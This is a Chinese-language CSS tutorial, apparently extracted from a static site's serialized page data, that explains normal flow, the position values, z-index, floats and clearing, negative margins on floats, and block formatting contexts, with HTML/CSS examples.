100px; height: 100px; padding: 25px; border: 1px solid red; }\n  .inner { width: 100px; height: 50px; float: left; }\n  /*同向设置外边距，外边距是负值。此时布局尺寸为100-25=75px，这一行还剩25px的空间*/\n  .col1 { background-color: red; margin-left: -25px;}\n  /*可以将margin-left从0慢慢变到-75px，一变到-75px就“上跳”了*/\n  /*同向设置外边距，外边距是负值。此时布局尺寸为100-75=25px，刚好可以放到上一行（剩余空间25px）*/\n  .col2 { background-color: blue; margin-left: -75px; opacity: 0.8;}\n  </style>\n</head>\n<body>\n  <div class="outer">\n      <div class="inner col1"></div>\n      <div class="inner col2"></div>\n  </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n浮动元素反向设置外边距，因为是在后面增加或者减少布局尺寸的，所以并不会影响到当前浮动元素的展示效果的位置，但是会对后面紧挨着它的浮动元素（如果有的话）有影响（后面元素会位移）。可以看下面这个对比例子。\n\n<html>\n<head>\n  <style>\n  .outer { width: 100px; height: 100px; padding: 25px; border: 1px solid red; }\n  .inner { width: 50px; height: 50px; box-sizing: border-box; }\n  .col1 { float: left; background-color: red; }\n  .col2 { float: left; background-color: blue; }\n  .col3 { float: right; margin-right: -50px; border: 3px solid green; } /*同向设置外边距，有位移，在outer边界的右边显示*/\n  /*.col3 { float: right; margin-left: -50px; border: 3px solid green; }*/ /*反向设置外边距，无位移，在outer边界的左边显示*/\n  /*.col3 { float: left; margin-left: -50px; border: 3px solid green; }*/ /*正向设置外边距，有位移，在outer边界的左边显示*/\n  /*.col3 { float: left; margin-right: -50px; border: 3px solid green; }*/ /*反向设置外边距，无位移，在outer边界的右边显示*/\n  </style>\n</head>\n<body>\n  <div class="outer">\n      <div class="inner col1"></div>\n      <div class="inner col2"></div>\n      <div class="inner col3"></div>\n  </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n弄懂上面所有规则和例子，在后面三列布局中你会明白类似于margin-right:-100%的作用了，至于100%就很简单了，是父级元素的contentArea宽度的百分比，不包含父级元素的内边距宽度哦！还有，在三列布局中不一定要使用margin-right:-100%，原因是父级的contentArea宽度比左右两列小时，margin-right:-100%就无法让左右两列上跳了。\n\n\n# 四、BFC\n\n\n# 4.1 什么是BFC\n\n格式化上下文（Formatting Context）是页面中的一个渲染区域，并且有自己的一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。\n\n那么块级格式上下文（Block Formatting Context，BFC）就很好理解了，是一个块级的渲染区域，这个块级“容器”内部布局是独立的，并且也不会影响到外部元素（与外界隔离了）。\n\n\n# 4.2 怎么触发BFC\n\n下列方式会触发BFC：\n\n * 根元素：<html>；\n * 溢出：除了overflow: visible；\n * 浮动元素：除了float: none；\n * 绝对定位元素：position为absolute | fixed；\n * 行内块元素、弹性元素、网格元素：display为inline-block | flex | grid，弹性元素还包括display: inline-flex元素的直接子元素，网格元素还包括display: inline-grid元素的直接子元素；\n * 表格相关：display为table | inline-table | table-row | table-row-group | table-header-group | table-footer-group | table-cell | table-caption；\n * 多列相关：column-count 或 column-width 不为auto，column-span 为all的元素始终会创建一个新的BFC，即使该元素没有包裹在一个多列容器中（标准变更，Chrome bug）；\n * 渲染相关：contain为layout |content | paint的元素；\n * 其他：display: flow-root可以创建无副作用的 BFC。\n\n\n# 4.3 BFC的作用\n\n可以规避块级盒子的上下外边距折叠问题，相当于两个容器挨着，但容器内部与容器壁之间有间距，两个间距加起来就是两个不同容器内部元素之间的距离。\n\n<html>\n<head>\n    <style type="text/css">\n    /*display: flow-root会创建无副作用的BFC*/\n    .container { display: flow-root; }\n    p {\n        width: 100px;\n        height: 100px;\n        background: lightblue;\n        margin: 20px;\n    }\n    </style>\n</head>\n<body>\n  \x3c!--可以去掉两个div，看看p的之间的间距是否折叠--\x3e\n  <div class="container">\n      <p></p>\n  </div>\n  <div class="container">\n      <p></p>\n  </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n可以包裹住浮动元素，因为计算BFC的高度时，浮动元素也参与计算。效果上看是“清除浮动”，让浮动元素当作类似于内联块级盒子一样。\n\n<html>\n<head>\n    <style type="text/css">\n    /*创建无副作用的BFC，可以去掉“display: flow-root”看一下outer这个div是否能包裹住浮动元素*/\n    .outer { display: flow-root; border: 1px solid #000; }\n    .inner {\n        float: left;\n        width: 100px;\n        height: 100px;\n        background: #eee;\n    }\n    </style>\n</head>\n<body>\n<div class="outer">\n    <div class="inner"></div>\n</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n可以避免被浮动元素覆盖，因为BFC的区域不会与float box重叠。在浮动那节说过，浮动后面的元素会占据浮动之前的位置，那么浮动元素是很可能遮住后面的元素，但是后面元素的文本图片等内容会围绕着浮动元素来展示。那么BFC是让后面的元素也避开浮动元素，不被遮挡。\n\n<html>\n<head>\n    <style type="text/css">\n        .left { float: left; width: 100px; height: 100px; background-color: red; }\n        /*display: flow-root会创建无副作用的BFC*/\n        .right { display: flow-root; width: 300px; height: 200px; background-color: #cccccc; }\n    </style>\n</head>\n<body>\n    <div class="left"></div>\n    <div class="right">实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n',normalizedContent:'# 定位与浮动\n\n\n# 一、正常布局流\n\n正常布局流（正常文档布局流）是一种在不对页面进行任何布局控制时，浏览器默认使用的html布局方式。具体来说就是，元素会按照书写模式顺序还有元素各自的特性去排列。\n\n比如在水平书写模式下，一般是从左到右从上到下的顺序，内联元素的特性是在一行里水平排列，块级元素是占满一行的垂直式排列。那么最终，内联元素水平从左到右排列，块级元素垂直从上到下排列。\n\n<html>\n<head>\n    <style type="text/css">\n        div { background-color: red; }\n        span { background-color: green; }\n    </style>\n</head>\n<body>\n    \x3c!--div是块级元素它是垂直从上到下排列的--\x3e\n    <div>div元素1</div>\n    <div>div元素2</div>\n    \x3c!--span是内联元素它是水平从左到右排列的--\x3e\n    <span>span元素1</span>\n    <span>span元素2</span>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 二、定位\n\n定位是为了精确地定义元素框将要出现的位置，可能会将元素从正常文档流中取出。定位使用position属性，其值是static | relative | absolute | fixed | sticky。\n\n\n# 2.1 static静态定位\n\nposition: static是静态定位，将元素放入它在文档布局流中的正常位置，相当于元素就是默认处于正常文档布局流中。\n\n<html>\n<head>\n    <style type="text/css">\n    .positioned {\n        position: static;/* 这行写上没写上都一样 */\n        background: yellow;\n    }\n    </style>\n</head>\n    <body>\n        <p class="positioned"> ... </p>\n    </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 2.2 relative相对定位\n\nposition: relative是相对定位，元素会相对于元素原本的位置进行偏移。元素其实还在正常文档布局流中，只是相比于原来位置被推移出一段距离（可能会遮挡其他元素）。偏移使用top、bottom、left和right这四个属性，值一般是正值，如果是负值那就是反方向的。\n\n<html>\n<head>\n    <style type="text/css">\n    .outer {\n        width: 200px;\n        height: 100px;\n        border: 1px solid blue;\n    }\n    .inner {\n        width: 100px;\n        height: 50px;\n        top: 50px;   /*元素上方往下推移50px*/\n        left: 100px; /*元素左边往右推移100px*/\n        position: relative;\n        background: yellow;\n    }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 2.3 absolute绝对定位\n\nposition: absolute是绝对定位，元素会脱离正常文档布局流，在独立的一层里显示，它也有偏移只不过相对于父级元素来说的。偏移使用top、bottom、left和right这四个属性，值一般是正值，如果是负值那就是反方向的。\n\n绝对定位和相对定位的差别就是，一个脱离了正常文档流，而另一个还在正常文档流里，绝对定位元素脱离后它原本的位置会被文档流里的其他元素占据，而相对定位元素的则不会。\n\n另外，绝对定位是有一个前提的，就是父级元素得开启定位，不然其实跟后面要讲的固定定位一样是相对于页面来定位的。比如父级元素开启相对定位，子级元素开启绝对定位，那此时子级元素是对于父级元素的来定位的，否则就会是相对于整个页面来定位。\n\n<html>\n<head>\n    <style type="text/css">\n    .outer {\n        position: relative; /*这个去掉后，子元素的绝对定位就会相对于页面了*/\n        width: 100px;\n        height: 400px;\n        padding: 0 25px;\n        margin: 50px;\n        border: 1px solid blue;\n    }\n    .inner1, .inner2, .inner3 {\n        width: 100px;\n        height: 100px;\n        margin: 25px 0;\n        border: 1px solid red;\n    }\n    .inner1 {\n        background: yellow;\n    }\n    .inner2 {\n        position: absolute; /*脱离文档流，相对于父级定位，那么父级的内边距是影响不到子元素了*/\n        /*偏移没设置那就是auto，也就是原本的位置，设置0就是父级边框左上角位置*/\n        top: 40px; /*偏移后的效果也是得考虑元素的布局尺寸的，也就是外边距，40+25=65px*/\n        left: 40px; /*左边距为0，从左往右推移40px*/\n        background: green;\n    }\n    .inner3 {\n        background: red;\n    }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner1"></div>\n        <div class="inner2"></div>\n        <div class="inner3"></div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\ntop、bottom、left和right对绝对定位元素间隔的影响：\n\n 1. top、bottom、left和right这四个值默认值是auto，表示元素虽然脱离了正常文档流但还是在原位，其实原位也被别人占据了（重叠了）。\n 2. 如果top和bottom中有一个是auto而另一个是有效数值，那按照有效数值那个属性来偏移；left和right也是一样的情况。\n 3. 如果左右只设置一个，上下也只设置一个的话，其实就是将前两条规则结合起来了。比如left:0;top:auto;那就是左边间距0而上下还是在原来位置（元素y轴距离还是原来位置），left:auto;top:10px;同理，上边距10px，左右还在原来位置（元素x轴距离还是原来位置）。\n 4. 如果那四个属性都是设置的有效数值，一般按照正常文档流的左和上来决定left和top优先。\n 5. 那四个属性都是设置的有效数值，但是又来了个margin。如果margin在一个方向上是auto，那绝对定位元素的这个方向上还是在原位。跟那四个设置auto情况类似（规则1），其他情况也基本类似（宽高影响还有规则234）。\n 6. 如果那四个属性还有margin都是设置的有效数值，那间隔将会是累积而不是折叠，其实就是对布局尺寸进行偏移。比如left: 2em;和margin-left: 2em;，左侧间隔就是4em。\n\n将这六条样式代码放到下面例子的span样式里，就可以看到上面6条不同规则显示效果：\ntop: auto; bottom: auto; left: auto; right: auto;// 原位\ntop: 10px; bottom: auto; left: 20px; right: auto;// top和left生效\ntop: auto; left: 0;或top: 10px; left: auto;// top或left生效\ntop: 0; left: 2em; right: 1em; width: 5em; background: silver;// top和left优先\ntop: 1em; left: 1em; right: 1em; width: 5em; margin: 0 auto; background: silver;// margin中的auto会优先，而margin中的0不会优先\ntop: 0; left: 2em; right: 12em; width: 5em; margin-left: 2em; margin-right: 1em; background: silver;// 间隔累积4em，其实就是对布局尺寸进行偏移\n\n<html>\n<head>\n  <style type="text/css">\n    p { position: relative; padding-left: 20px; width:500px; }\n    span { position: absolute; }\n  </style>\n</head>\n<body>\n  <p>\n    when we consider the effect of positioning, it quickly becomes clear that\n    authors can do a great deal of damage to layout, just as they can do very\n    interesting things.<span>[4]</span>\n    this is usually the case with useful technologies: the sword always has at\n    least two edges, both of them sharp.\n  </p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 2.4 fixed固定定位\n\n绝对定位会脱离正常文档流，然后相对于最近的祖先进行定位。而fixed固定定位与之类似也会脱离正常文档流，但是相对于浏览器视窗viewport进行定位。\n\n<html>\n<head>\n<style>\n      body {\n        width: 500px;\n        height: 800px;\n        margin: 0 auto;\n      }\n      h1 {\n        position: fixed; /*固定定位*/\n        top: 0px;\n        width: 500px;\n        margin-top: 0;\n        background: white;\n        padding: 10px;\n      }\n      p {\n        background: aqua;\n        border: 3px solid blue;\n        padding: 10px;\n        margin: 10px;\n      }\n      p:nth-of-type(1) {\n        margin-top: 62px; /* 最顶上的p需要与顶部有间隔，防止一开始被h1遮挡 */\n      }\n    </style>\n</head>\n<body>\n    <h1>fixed positioning</h1>\n    <p>i am a basic block level element. my adjacent block level elements sit on new lines below me.</p>\n    <p>now i\'m absolutely positioned relative to the <code>&lt;body&gt;</code> element, not the <code>&lt;html&gt;</code> element!</p>\n    <p>we are separated by our margins. because of margin collapsing, we are separated by the width of one of our margins, not both.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# 2.5 sticky粘性定位\n\n粘性定位：当元素滚动到父容器边缘时会黏在容器边缘，黏住的前提是在滚动方向上设置了合适的偏移。\n\n偏移就是前面几节提到的top、bottom、left和right，偏移量的设置会让元素在黏住的地方形成一种相对定位，不过这个相对定位只会体现在这个滚动方向上，比如上下滚动那设置top和bottom就会让元素在上下黏住，而left和right就会无效除非左右也能滚动。\n\n<html>\n<head>\n<style type="text/css">\n      .outer {\n        width: 400px;\n        height: 300px;\n        overflow-y: auto;\n        margin: 50px auto;\n        border: 1px solid;\n      }\n      .outer div {\n        width: 90%;\n        height: 100px;\n        margin: 5%;\n      }\n      .inner1 {\n        background: red;\n      }\n      .inner2 {\n        position: sticky;\n        top: 10px;  /*内容上下滚动的，设置的是top，那就会在距离div上边缘10px的地方黏住*/\n        left: 10px; /*内容上下滚动的，这个left是无效的*/\n        background: skyblue;\n      }\n      .inner3 {\n        background: blue;\n      }\n      .inner4 {\n        background: green;\n      }\n      .inner5 {\n        background: black;\n      }\n</style>\n</head>\n<body>\n    <div class="outer">\n      <div class="inner1"></div>\n      <div class="inner2"></div>\n      <div class="inner3"></div>\n      <div class="inner4"></div>\n      <div class="inner5"></div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# 2.6 定位元素的隐藏等式\n\n定位元素在包含块中有个隐藏的等式，它与块级元素在水平方向上的等式很像，只是多出了四个位移。\n\n定位元素的水平方向： left + margin-left + border-left-width + padding-left + width + padding-right + border-right-width + margin-right + right = the width of the containing block\n\n定位元素的垂直方向： top + margin-top + border-top-height + padding-top + height + padding-bottom + border-bottom-height + margin-bottom + bottom = the height of the containing block\n\n\n# 2.7 z-index对定位的影响\n\n使用定位来控制元素时，难免会碰到元素重叠的情况，那么决定哪个元素在上面哪个元素在下面就很重要，可以使用z-index属性来控制它们。z-index的值是整数，负数、0、正数都可以的，数值越大里开发者（观察者）越近。\n\n<html>\n<head>\n<style type="text/css">\np {\n  position: absolute;\n  border: 1px solid;\n  background: #ddd;\n  margin: 0;\n}\n#one {\n  top: 1em;\n  left: 1em;\n  width: 40%;\n  height: 10em;\n  z-index: 3;\n}\n#two {\n  top: 2em;\n  left: 15%;\n  width: 50%;\n  height: 4.5em;\n  z-index: 10;\n}\n#three {\n  top: 10%;\n  left: 30%;\n  width: 30%;\n  height: 10em;\n  z-index: 8;\n}\np[id] em {\n  position: absolute;\n  top: -1em;\n  left: -1em;\n  width: 10em;\n  height: 5em;\n}\n#one em {\n  z-index: 100;\n  background: hsla(0, 50%, 70%, 0.9);\n}\n#two em {\n  z-index: 10;\n  background: hsla(120, 50%, 70%, 0.9);\n}\n#three em {\n  z-index: -343;\n  background: hsla(240, 50%, 70%, 0.9);\n}\n</style>\n</head>\n<body>\n<p id="one">文本1 <em>强调文本1.1</em> </p>\n<p id="two">文本2 <em>强调文本2.1</em> </p>\n<p id="three">文本3 <em>强调文本3.1</em> </p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n对于上面这个例子你可能会对三个<em>的z-index设置感到疑惑，因为父元素设置了z-index后会建立自己的本地堆栈上下文（包含块），后代元素也是跟随着父元素的z-index而会忽略自身的z-index，可以明确的是子元素会比父元素更高但不会超过其他比父元素高的包含块。\n\n\n# 三、浮动\n\n\n# 3.1 什么是浮动\n\n什么是浮动？一个元素脱离正常的文档布局流，并吸附到其父容器的某一边。原本在浮动元素后面的元素，现在会占据它的位置，并且内容会围绕着浮动元素来展示。\n\n“占据它的位置”的理解：后面是块级元素那就会占据原本浮动元素的那一行，后面是内联元素就会水平挪动到原本浮动元素那个位置。这样的话，后面的元素可能会被浮动元素所遮挡。\n\n“内容会围绕着浮动元素来展示”的理解：虽然我会占据你原本的位置，但是我里面的文字图片等内容是要围绕着你浮动元素展示的，也就是说内容不会被浮动元素所遮住。（但不要认为是子元素不会被遮挡，是文字图片等展示内容不会被遮挡）\n\n浮动使用float属性，其值是left | right | none。left和right就是分别向左和右浮动，而none完全是为了屏蔽其他地方样式的影响。\n\n<html>\n<head>\n    <style type="text/css">\n    .box {\n        float: left;\n        width: 150px;\n        height: 150px;\n        border: 2px solid blue;\n        border-radius: 8px;\n        margin-right: 20px;\n    }\n    </style>\n</head>\n<body>\n    <h1>simple float example</h1>\n    <div class="box">float</div>\n    <p> lorem ipsum dolor sit amet, consectetur adipiscing elit. nulla luctus aliquam dolor, eu lacinia lorem placerat vulputate. duis felis orci, pulvinar id metus ut, rutrum luctus orci. cras porttitor imperdiet nunc, at ultricies tellus laoreet sit amet. sed auctor cursus massa at porta. integer ligula ipsum, tristique sit amet orci vel, viverra egestas ligula. curabitur vehicula tellus neque, ac ornare ex malesuada et. in vitae convallis lacus. aliquam erat volutpat. suspendisse ac imperdiet turpis. aenean finibus sollicitudin eros pharetra congue. duis ornare egestas augue ut luctus. proin blandit quam nec lacus varius commodo et a urna. ut id ornare felis, eget fermentum sapien.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 3.2 浮动规则\n\n浮动元素的包含块是最近的块级祖先元素。浮动元素本身会形成块级框，即使这个元素之前是内联元素。具体浮动规则如下：\n\n 1. 浮动元素的左右外边界不能超出包含块的左右内边界。\n 2. 如果前面元素左浮动，那么后面浮动元素的左边界必定处于前面元素右边界的右侧，除非后面浮动元素的顶边在前面浮动元素的下边；右浮动的情况类比。\n 3. 左右两边浮动的元素之间也不能重叠，如果放不下会自动往下挪。\n 4. 浮动元素的顶边不能比父元素的内顶边高，与第1条相似，但父元素不一定是块级元素。\n 5. 浮动元素的顶边不能比前方任何一个浮动元素或块级元素的顶边高；上一条是父子关系，这条是兄弟关系，“弟弟”最多和“哥哥”平齐。\n 6. 浮动元素的顶边不能比它原本未浮动前所在框体顶边还高。\n 7. 满足其他条件后，浮动元素要尽可能上移。\n 8. 满足其他条件后，左浮动元素尽可能左移，右浮动元素尽可能右移。\n\n以上规则的前提是不使用边距来影响浮动的位置，因为使用边距后可能会在视觉上让浮动元素的边界超出父级元素的边界，也让浮动元素在视觉上重叠。\n\n\n# 3.3 清除浮动\n\n当元素浮动时，其他元素的内容会围绕着浮动元素来展示，但总会有特殊场景需要某个元素不再围绕着浮动元素展示。\n\n清除浮动使用clear属性，有三个值：left停止任何活动的左浮动，right停止任何活动的右浮动，both停止任何活动的左右浮动。\n\n清除浮动的理解：因为浮动元素后面的元素会占据浮动元素的一行（块级元素）或者水平位置（内联元素），那么清除浮动后，后面的元素会退回到下一行（块级元素）或者水平其他位置（内联元素）。\n\n比如下面这个例子的页脚，不加clear和加了clear效果不同：\n\n<html>\n<head>\n    <style type="text/css">\n        body {\n            width: 50%;\n            max-width: 500px;\n            margin: 0 auto;\n        }\n        div:nth-of-type(1) {\n            width: 36%;\n            float: left;\n        }\n        div:nth-of-type(2) {\n            width: 30%;\n            float: left;\n            margin-left: 4%;\n        }\n        div:nth-of-type(3) {\n            width: 26%;\n            float: right;\n        }\n        /*加了clear后，页脚会退回到下一行，也就是单独新一行里*/\n        footer {\n          clear: both;\n        }\n    </style>\n</head>\n<body>\n    <h1>float disaster</h1>\n    <div>\n      <h2>first column</h2>\n      <p> lorem ipsum dolor sit amet, consectetur adipiscing elit. nulla luctus aliquam dolor, eu lacinia lorem placerat vulputate. duis felis orci, pulvinar id metus ut, rutrum luctus orci. </p>\n    </div>\n    <div>\n      <h2>second column</h2>\n      <p>nam vulputate diam nec tempor bibendum. donec luctus augue eget malesuada ultrices. phasellus turpis est, posuere sit amet dapibus ut, facilisis sed est. </p>\n    </div>\n    <div>\n      <h2>third column</h2>\n      <p>nam consequat scelerisque mattis. duis pulvinar dapibus magna, eget congue purus mollis sit amet. sed euismod lacus sit amet ex tempus, a semper felis ultrices. maecenas a efficitur metus. </p>\n    </div>\n    <footer>\n      <p>©2016 your imagination. this isn\'t really copyright, this is a mockery of the very concept. use as you wish.</p>\n    </footer>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# 3.4 浮动的注意点\n\n * 浮动元素的内外边距和边框如果影响过大，可能会破坏布局（其实不是浮动本身的问题）。为了减少计算量，可以设置box-sizing: border-box，只算width和外边距。\n\n * 围绕着浮动元素展示的内容与浮动元素之间的间隔，是完全取决于浮动元素设置的外边距的。其实就是之前类似的解释，你浮动了，我现在占据了你的位置，你我之间是没有间距的（但可能会是遮挡关系），而我的文字图片等内容会围绕着你展示，就算内容也设置外边距也只在我里面有效。\n\n * 浮动元素之间的外边距是没有折叠的，比如你外边距50px我外边距60px，那你我之间的间隔是110px，不像之前的外边距是有折叠就是60px（两个中取最大值）。\n\n * 实际上，浮动元素在父元素中所占的面积的有效高度为0。比如在上一节的例子中，如果去掉<footer>这个标签，那body实际高度只有<h1>这个高度。解决办法就是给浮动元素后面的元素进行清除浮动。刚好上一节例子里页脚也是需要清除浮动的，但不是每个页面都有页脚，那就可以使用一个空的<div>标签并设置clear: both即可。\n\n<html>\n<head>\n<style type="text/css">\n      * {\n        box-sizing: border-box;\n      }\n      body {\n        width: 90%;\n        max-width: 800px;\n        margin: 0 auto;\n      }\n      footer {\n        margin-top: 4%;\n      }\n      div:nth-of-type(1) {\n        width: 30%;\n        float: left;\n      }\n      div:nth-of-type(2) {\n        width: 30%;\n        float: left;\n        margin-left: 5%;\n      }\n      div:nth-of-type(3) {\n        width: 30%;\n        float: right;\n      }\n      .clearfix {\n        clear: both;\n      }\n      .column, footer {\n        padding: 1%;\n        border: 2px solid black;\n        background-color: red;\n      }\n</style>\n</head>\n<body>\n    <h1>float disaster</h1>\n    <div class="column">\n      <h2>first column</h2>\n      <p> lorem ipsum dolor sit amet, consectetur adipiscing elit. nulla luctus aliquam dolor, eu lacinia lorem placerat vulputate. duis felis orci, pulvinar id metus ut, rutrum luctus orci. </p>\n    </div>\n    <div class="column">\n      <h2>second column</h2>\n      <p>nam vulputate diam nec tempor bibendum. donec luctus augue eget malesuada ultrices. phasellus turpis est, posuere sit amet dapibus ut, facilisis sed est. </p>\n    </div>\n    <div class="column">\n      <h2>third column</h2>\n      <p>nam consequat scelerisque mattis. duis pulvinar dapibus magna, eget congue purus mollis sit amet. sed euismod lacus sit amet ex tempus, a semper felis ultrices. maecenas a efficitur metus. nullam tempus pharetra pharetra. </p>\n    </div>\n    \x3c!--空div用于清除浮动，可以解决footer围绕问题，也可以让前面的浮动div有实际面积--\x3e\n    <div class="clearfix"></div>\n    <footer>\n      <p>©2016 your imagination. this isn\'t really copyright, this is a mockery of the very concept. use as you wish.</p>\n    </footer>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n\n\n# 3.5 边距对浮动的影响\n\n建议先看边距对盒子的影响这一节。浮动是脱离了正常文档流，但也还是符合“边距对盒子的影响”的，只不过是在当前的布局流也就是浮动布局中的，并且也要符合浮动规则。\n\n同向设置外边距：给左浮动元素添加左外边距，或者是给右浮动元素添加右外边距。\n反向设置外边距：给左浮动元素添加右外边距，或者是给右浮动元素添加左外边距。\n\n浮动元素的布局尺寸超过一行剩余空间就会跳到下一行里浮动，而小于等于上一行剩余空间就可能会跳到上一行里浮动（包含剩余空间为0的情况，此时布局尺寸也为0，其实就是圣杯布局里使用的手段）。\n\n四种情况：\n\n * 如果同向设置外边距，且外边距是正值。那么布局尺寸增大，展示尺寸不变，在前方增加的，会把展示效果往后推移。比如float: left;margin-left: 25px，布局尺寸宽度增大25px，展示尺寸不变，但是展示效果会被从左往右（从前往后）推移25px。\n * 如果同向设置外边距，且外边距是负值。那么布局尺寸减少，展示尺寸不变，在前方减小的，会把展示效果往前拉移。比如float: left;margin-left: -25px，布局尺寸宽度减少25px，展示尺寸不变，但是展示效果会被从右往左（从后往前）拉移25px。\n * 如果反向设置外边距，且外边距是正值。那么布局尺寸增大，展示尺寸不变，在后方增加的，也不会影响展示效果的位置。比如float: right;margin-left: 25px，只有布局尺寸宽度增大了25px，其他没变。\n * 如果反向设置外边距，且外边距是负值。那么布局尺寸减少，展示尺寸不变，在后方减少的，也不会影响展示效果的位置。比如float: right;margin-left: -25px，只有布局尺寸宽度减少了25px，其他没变。\n\n可以看到下面这个例子，父级内边距25px与浮动元素外边距-25px抵消了（布局尺寸宽度减小25px），显示效果就是浮动元素的左边界与父级元素的左边界重合（从左往右位移25px）。\n\n<html>\n<head>\n  <style>\n  .outer { width: 100px; height: 100px; padding: 25px; border: 1px solid red; }\n  /*同向设置外边距，外边距是负值。布局尺寸宽度减少25px，展示尺寸不变，但是展示效果会被从右往左（从后往前）拉移25px*/\n  .inner { width: 100px; height: 50px; float: left; background-color: red; margin-left: -25px; }\n  </style>\n</head>\n<body>\n  <div class="outer">\n    <div class="inner"></div>\n  </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n为了方便，将“跳到上一行里浮动”简称为“上跳”，将“跳到下一行里浮动”简称为“下跳”。上跳有个前提，需要遵守“浮动元素的顶边不能比它原本未浮动前所在框体顶边还高”这条规则。还有不管上跳还是下跳，都只会跳一行，也就是说正负情况下，都只有各自的一个临界点来跳行。\n\n<html>\n<head>\n  <style>\n  .outer { width: 100px; height: 100px; padding: 25px; border: 1px solid red; }\n  .inner { width: 50px; height: 50px; float: left; }\n  /* 当前这一行的的剩余空间100-50=50px */\n  .col1 { background-color: red; }\n  /* 同向设置外边距，外边距是正值。此时布局尺寸是30+21=51px，要大于上一行的的剩余空间50px，所以下跳了 */\n  .col2 { width: 30px; background-color: blue; margin-left: 21px;}\n  </style>\n</head>\n<body>\n  <div class="outer">\n      <div class="inner col1"></div>\n      <div class="inner col2"></div>\n  </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n下面这个例子就是上跳的示例，可以将.col2的margin-left从0慢慢变到-75px。同向设置外边距，外边距是负值，布局尺寸减少，并且展示效果会从后往前拉移。这个布局尺寸小于等于上一行剩余位置时会发生“上跳”，如果再继续增大外边距的绝对值，还会继续从后往前拉移。\n\n<html>\n<head>\n  <style>\n  .outer { width: 100px; height: 100px; padding: 25px; border: 1px solid red; }\n  .inner { width: 100px; height: 50px; float: left; }\n  /*同向设置外边距，外边距是负值。此时布局尺寸为100-25=75px，这一行还剩25px的空间*/\n  .col1 { background-color: red; margin-left: -25px;}\n  /*可以将margin-left从0慢慢变到-75px，一变到-75px就“上跳”了*/\n  /*同向设置外边距，外边距是负值。此时布局尺寸为100-75=25px，刚好可以放到上一行（剩余空间25px）*/\n  .col2 { background-color: blue; margin-left: -75px; opacity: 0.8;}\n  </style>\n</head>\n<body>\n  <div class="outer">\n      <div class="inner col1"></div>\n      <div class="inner col2"></div>\n  